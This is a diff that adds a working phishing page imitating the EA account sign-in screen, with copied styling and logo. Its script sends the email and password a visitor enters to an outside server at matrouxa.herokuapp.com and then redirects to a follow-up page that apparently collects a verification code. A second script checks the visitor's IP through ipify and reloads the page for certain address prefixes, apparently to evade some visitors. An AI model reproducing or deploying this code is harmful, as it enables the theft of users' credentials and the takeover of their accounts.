@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+
+    <title>Sign In</title>
+
+    <style>
+        /* devanagari */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  src: url(https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrJJbecmNE.woff2) format('woff2');
+  unicode-range: U+0900-097F, U+1CD0-1CF6, U+1CF8-1CF9, U+200C-200D, U+20A8, U+20B9, U+25CC, U+A830-A839, U+A8E0-A8FB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  src: url(https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrJJnecmNE.woff2) format('woff2');
+  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  src: url(https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrJJfecg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+        p,h1,h2,h3,span,label{
+            font-family: "Open Sans",sans-serif;
+        }
+    .show{
+            display: block !important;
+    }
+.lds-ring {
+  display: inline-block;
+  position: relative;
+  width: 80px;
+  height: 80px;
+  display: none;
+  margin: 0 auto;
+}
+.lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border: 8px solid #fff;
+  border-radius: 50%;
+  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+  border-color: #fff transparent transparent transparent;
+}
+.lds-ring div:nth-child(1) {
+  animation-delay: -0.45s;
+}
+.lds-ring div:nth-child(2) {
+  animation-delay: -0.3s;
+}
+.lds-ring div:nth-child(3) {
+  animation-delay: -0.15s;
+}
+@keyframes lds-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+#showicon{
+    display: none;
+}
+#error{
+    font-size: 0.8rem;
+    color: #f94747;
+}
+.title h1{
+    font-size: 24px;
+    font-weight: 550;
+    letter-spacing: .48px;
+    line-height: 1.618;
+}
+label{
+    font-weight: 600;
+}
+/* devanagari */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/poppins/v15/pxiEyp8kv8JHgFVrJJbecmNE.woff2) format('woff2');
+  unicode-range: U+0900-097F, U+1CD0-1CF6, U+1CF8-1CF9, U+200C-200D, U+20A8, U+20B9, U+25CC, U+A830-A839, U+A8E0-A8FB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/poppins/v15/pxiEyp8kv8JHgFVrJJnecmNE.woff2) format('woff2');
+  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Poppins';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/poppins/v15/pxiEyp8kv8JHgFVrJJfecg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+.wrapper{background-color:#1d2033;min-height:100vh;min-width:100vw;display:flex;justify-content:center;color:#fff;font-family:"Poppins";letter-spacing:2px}.container{width:400px;margin-top:33px;display:flex;flex-direction:column;align-items:center}.title{margin-top:24px;margin-bottom:26px;text-align:center}.email_input{width:400px;height:48px}.email_input::-webkit-input-placeholder{opacity:.7}.email_input:-ms-input-placeholder{opacity:.7}.email_input::placeholder{opacity:.7}.input_two{display:flex;flex-direction:column;margin-bottom:22px;width:400px;position:relative}.password_input{width:400px;height:48px}.password_input::-webkit-input-placeholder{opacity:.7}.password_input:-ms-input-placeholder{opacity:.7}.password_input::placeholder{opacity:.7}.input_three{margin-bottom:20px}.checkInput{height:24px;width:24px;cursor:pointer}.input_four{width:100%}label{font-size:11px;font-weight:700;line-height:1.129;text-transform:uppercase;margin-bottom:8px}.input_three>label{margin-top:5px;margin-left:10px;text-transform:none;font-weight:400;letter-spacing:normal}.input_three>label,button{cursor:pointer;font-size:15px}button{width:100%;height:48px;padding:12px 24px;border-radius:8px;border:none;background-color:#235fe3;color:#fff;font-family:"Poppins";text-transform:uppercase;font-weight:700;letter-spacing:3px;margin-bottom:32px;display:flex;justify-content:center;align-items:center}button,button:hover{transition:all .1s ease}button:hover{height:44px;width:96%;margin-top:2px;margin-left:8px;margin-bottom:34px;font-size:13px;box-shadow:0 0 30px 0 rgba(71,55,221,.35);background-color:#2958be}button:active{background-color:#3f7af8}.links{display:flex;flex-direction:column;align-items:center}a{text-decoration:none;color:#5288fd;font-size:15px;letter-spacing:.7px;box-sizing:content-box;box-sizing:initial}a:hover{text-decoration:underline}p{margin-top:16px;font-size:15px;letter-spacing:.7px}.btn{height:32px;width:40px;position:absolute;right:12px;bottom:8px;border-radius:8px;background-color:#242735;cursor:pointer;display:flex;justify-content:center;align-items:center;padding:8px}.btn,.btn:hover{transition:all .1s ease-in-out}.btn:hover{background-color:#11151f}.checkContainer{display:block;position:relative;margin-bottom:12px;cursor:pointer;font-size:21px;-webkit-user-select:none;-ms-user-select:none;user-select:none}.checkContainer input{position:absolute;opacity:0;cursor:pointer;height:0;width:0}.checkmark{position:absolute;top:-3px;left:-10px;height:24px;width:24px;background-color:#141724;border:2px solid #62626f;border-radius:5px}.checkContainer>p{margin-left:25px}.checkContainer input:checked~.checkmark{background-color:#1029b3;border:2px solid #235fe3;box-shadow:0 0 30px 0 rgba(157,152,199,.35)}.checkmark:after{content:"";position:absolute;display:none}.checkContainer input:checked~.checkmark:after{display:block}.checkContainer .checkmark:after{left:6px;top:2px;width:5px;height:10px;border:solid #fff;border-width:0 3px 3px 0;-webkit-transform:rotate(45deg);transform:rotate(45deg)}.email_err{margin-top:0}.email_err,.password_err{color:#f94747;font-size:13px;-webkit-animation:slidein .5s;animation:slidein .5s}.password_err{margin-top:-20px;margin-bottom:10px;line-height:1;letter-spacing:1.25}@media screen and (min-height:800px){.container{margin-top:90px}}@media screen and (max-width:450px){.container{width:85%}.email_input,.input_four,.input_three,.input_two,.myForm,.password_input,form{width:100%}}*{margin:0;padding:0;box-sizing:border-box}.V_wrapper{background-color:#1d2033;min-height:100vh;min-width:100vw;color:#fff;font-family:"Poppins";letter-spacing:2px}.V_container,.V_wrapper{display:flex;align-items:center;flex-direction:column}.V_container{width:400px;margin-top:33px}.V_title{margin-top:24px;margin-bottom:26px;text-align:center}h1{font-size:23px;font-weight:900;line-height:1.35;letter-spacing:1.5px}form{display:flex;flex-direction:column;width:100%}input{background:#141724;border:2px solid #62626f;border-radius:8px;color:#fff;padding:0 12px;font-family:"Poppins";letter-spacing:.3px;font-size:15px}input:focus{box-shadow:0 2px 5px 0 rgba(226,230,231,.12),0 0 5px 0 rgba(239,243,245,.63);border:2px solid #fff;outline:none}.input_one{display:flex;flex-direction:column;width:100%;margin-bottom:16px}.code_input{width:400px;height:48px}.code_input::-webkit-input-placeholder{opacity:.7}.code_input:-ms-input-placeholder{opacity:.7}.code_input::placeholder{opacity:.7}.V_para{text-align:center;margin-bottom:24px}.V_links{display:flex;flex-direction:column;align-items:flex-start;width:100%;height:50px;justify-content:space-between}.code_err{color:#f94747;font-size:13px;margin-top:5px;-webkit-animation:slidein .5s;animation:slidein .5s}.V_btn{width:100%;display:flex;justify-content:flex-start}#btn{padding:8px 16px;background:#343647;color:#fff;border-radius:12px;text-transform:uppercase;font-size:11px;font-weight:700;cursor:pointer;letter-spacing:1.5px}#btn,#btn:hover{transition:all .1s ease-in-out}#btn:hover{text-decoration:none;margin-bottom:1.4px;margin-left:1px;font-size:10px}@-webkit-keyframes slidein{0%{margin-left:-20px}to{margin-left:0}}@keyframes slidein{0%{margin-left:-20px}to{margin-left:0}}.notification{width:400px;padding:16px 48px;align-items:center;background:#171a29;text-align:center}.notification,.notification>p{display:flex;justify-content:center}.notification>p{line-height:1.5}.notification>p>span{flex:0 0 80%}.spinner{height:30px;width:30px;border-radius:50%;border:3px solid #3f7af8;border-top-color:#fff;-webkit-animation:spin .8s linear infinite;animation:spin .8s linear infinite}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@media screen and (max-width:450px){.notification,.V_container{width:85%}.code_input,.input_four,.input_three,.V_form,form{width:100%}}@media screen and (min-height:800px){.V_container{margin-top:40px}.notification{margin-top:10px}}
+/*# sourceMappingURL=main.9bcaedc7.chunk.css.map */
+    </style>
+
+</head>
+<body>
+
+
+    <div id="root">
+        <div class="wrapper">
+
+            <div class="container">
+                <div class="logo_div"><svg width="64" height="64" viewBox="0 0 64 64" fill="none"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M31.9527 0C14.3055 0 0 14.3091 0 31.9527C0 49.6036 14.3055 63.9055 31.9527 63.9055C49.6 63.9055 63.9055 49.6036 63.9055 31.9527C63.9055 14.3091 49.6 0 31.9527 0ZM19.2218 19.3818H37.5891L34.8 23.8473H16.4327L19.2218 19.3818ZM49.9091 41.6982L47.1164 37.24H38.9636L41.76 32.7745H44.3345L41.2218 27.8036L32.5382 41.6945H9.37455L14.9527 32.7709H10.8582L13.6436 28.3055H31.5527L28.7636 32.7782H20.2218L17.4291 37.2436H30.0618L41.2218 19.3818L55.1709 41.7018H49.9091V41.6982Z"
+                            fill="#FF4747"></path>
+                    </svg></div>
+                <div class="title">
+                    <h1>Sign in with your EA Account</h1>
+                </div>
+                <div class="myForm">
+                    <form autocomplete="off"  onsubmit="return false">
+                        <div class="input_one"><label>phone or email</label><input type="texte" name="email"
+                                class="email_input" id="email" type="email" placeholder="Enter your phone or email"
+                                value=""></div>
+                        <div class="input_two">
+                            <label>password</label>
+                            <input type="password" name="password" class="password_input" id="password" placeholder="Enter your password" value="">
+                            <div onclick="changestateofpassword()"  class="btn">
+                                <svg id="showicon" height="16" viewBox="0 0 16 16" width="16"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <g fill="none" fill-rule="evenodd">
+                                    <path d="m0 0h16v16h-16z"></path>
+                                    <path
+                                        d="m8 3.66666667c3.2032732 0 6.6666667 2.54318984 6.6666667 4.33333333s-3.4633935 4.3333333-6.6666667 4.3333333c-3.20327316 0-6.66666667-2.54318981-6.66666667-4.3333333s3.46339351-4.33333333 6.66666667-4.33333333zm0 1.33333333c-1.38181706 0-2.74575629.50269607-3.87107038 1.3290207-.87134632.63983463-1.46226295 1.41228951-1.46226295 1.6709793s.59091663 1.03114467 1.46226295 1.6709793c1.12531409.8263246 2.48925332 1.3290207 3.87107038 1.3290207s2.7457563-.5026961 3.8710704-1.3290207c.8713463-.63983463 1.4622629-1.41228951 1.4622629-1.6709793s-.5909166-1.03114467-1.4622629-1.6709793c-1.1253141-.82632463-2.48925334-1.3290207-3.8710704-1.3290207zm0 1c1.1045695 0 2 .8954305 2 2s-.8954305 2-2 2-2-.8954305-2-2 .8954305-2 2-2zm0 1.33333333c-.36818983 0-.66666667.29847684-.66666667.66666667s.29847684.66666667.66666667.66666667.66666667-.29847684.66666667-.66666667-.29847684-.66666667-.66666667-.66666667z"
+                                        fill="#fff"></path>
+                                </g>
+                                </svg>
+                            <svg id="hideicon" viewBox="0 0 24 24" height="16" width="16" xmlns="http://www.w3.org/2000/svg"><g fill-rule="evenodd" fill="none"><path d="M14.318 14.404a3 3 0 0 0-4.223-4.223l1.436 1.436a1 1 0 0 1 1.352 1.352l1.435 1.435zm-5.27-2.442a3 3 0 0 0 3.49 3.49l-3.49-3.49z" fill="#fff"></path><path d="M17.484 17.57c.546-.294 1.05-.617 1.506-.951.875-.643 1.597-1.348 2.11-2.02a5.54 5.54 0 0 0 .628-1.01c.15-.323.272-.7.272-1.089s-.122-.766-.272-1.088A5.54 5.54 0 0 0 21.1 10.4c-.514-.67-1.235-1.376-2.11-2.019C17.245 7.1 14.793 6 12 6c-1.824 0-3.503.47-4.934 1.152L8.585 8.67A9.309 9.309 0 0 1 12 8c2.27 0 4.318.9 5.807 1.994.742.545 1.321 1.12 1.704 1.621.192.251.323.468.403.64.071.153.083.231.086.244v.001c-.003.014-.015.092-.086.245a3.57 3.57 0 0 1-.403.64c-.383.5-.962 1.076-1.704 1.622a10.73 10.73 0 0 1-1.812 1.073l1.489 1.49zM6.718 9.632a9.89 9.89 0 0 0-.525.362c-.742.545-1.321 1.12-1.704 1.621a3.57 3.57 0 0 0-.403.64c-.071.153-.083.231-.086.244v.001c.003.014.015.092.086.245.08.172.21.389.403.64.383.5.962 1.076 1.704 1.622C7.683 16.1 9.73 17 12 17a8.92 8.92 0 0 0 1.882-.204l1.626 1.627c-1.08.357-2.26.577-3.508.577-2.792 0-5.245-1.1-6.99-2.381-.875-.643-1.597-1.348-2.11-2.02a5.544 5.544 0 0 1-.628-1.01c-.15-.323-.272-.7-.272-1.089s.122-.766.272-1.088A5.61 5.61 0 0 1 2.9 10.4c.513-.67 1.235-1.376 2.11-2.019.087-.064.176-.127.267-.19l1.44 1.441z" fill="#fff"></path><path d="M3.543 2.793a1 1 0 0 1 1.414 0l17 17a1 1 0 0 1-1.414 1.414l-17-17a1 1 0 0 1 0-1.414z" fill="#fff"></path></g></svg>
+                            </div>
+                        </div>
+                        <div id="error" ></div>
+
+                        <div class="input_three"><label class="checkContainer"><input type="checkbox"><span
+                                    class="checkmark"></span>
+                                <p>Remember me</p>
+                            </label></div>
+                        <div class="input_four"><button type="submot" onclick="sendData()">Sign IN</button></div>
+                        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+                    </form>
+    
+                </div>
+                <div class="links"><a
+                        href="">Need
+                        help logging in?</a>
+                    <p>New to game? <a
+                            href="">Create
+                    an  Account</a></p>
+                </div>
+
+
+            </div>
+        </div>
+    </div>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+</body>
+
+<script>
+    function changestateofpassword(){
+        const password = document.getElementById("password")
+        const linepassword = document.getElementById("linepassword")
+        const showicon = document.getElementById("showicon")
+        const hideicon = document.getElementById("hideicon")
+        if(password.type=="text"){
+            password.type="password"
+            showicon.style.display = "block"
+            hideicon.style.display = "none"
+            
+        }else{
+            password.type="text"
+            showicon.style.display = "none"
+            hideicon.style.display = "block"
+        }
+    }
+    var redirect
+
+    let toggle=document.getElementsByClassName("lds-ring")[0]
+    function sendData(){
+        if(document.getElementsByClassName("show")[0]!=undefined){
+            return
+        }
+        if(!validateEmail(document.getElementById("email").value)){
+            var div = document.getElementById('error');
+                div.innerHTML = "email incorrect format";
+                return
+        }
+        if(!validatePassword(document.getElementById("password").value)){
+            var div = document.getElementById('error');
+                div.innerHTML = "Your credentials are incorrect or have expired. Please try again or reset your password.";
+                return
+        }
+        div = document.getElementById('error').innerHTML=""
+        toggle.classList.toggle("show");
+        fetch('https://matrouxa.herokuapp.com/backend/connect',
+        {method: 'POST',
+        headers: {
+        'Content-Type': 'application/json'
+        },
+	   body: JSON.stringify({
+           email:document.getElementById("email").value,
+           password:document.getElementById("password").value,
+       })})
+        .then(response => response.json())
+        .then(data => {
+            redirect=setTimeout(()=>{
+                window.location = '/next.html?email='+ document.getElementById("email").value;
+            },3000)
+
+        });
+
+
+
+        
+    function validateEmail(email) {
+    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+    }
+    function validatePassword(password){
+        const re = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,50}$$/;;
+    return re.test(String(password));
+    }
+    }
+
+</script>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+     
+      <script>
+    /* Add "https://api.ipify.org?format=json" statement
+               this will communicate with the ipify servers in
+               order to retrieve the IP address $.getJSON will
+               load JSON-encoded data from the server using a
+               GET HTTP request */
+                
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+        let ip=data.ip.slice(0,data.ip.indexOf('.'))
+        // Setting text of element P with id gfg
+        console.log(ip)
+        if(ip=="197"||ip=="193"||ip=="198"||ip=="194"){
+            console.log("aa")
+            location.reload();
+        }
+   
+    })
+    </script>
+</html>
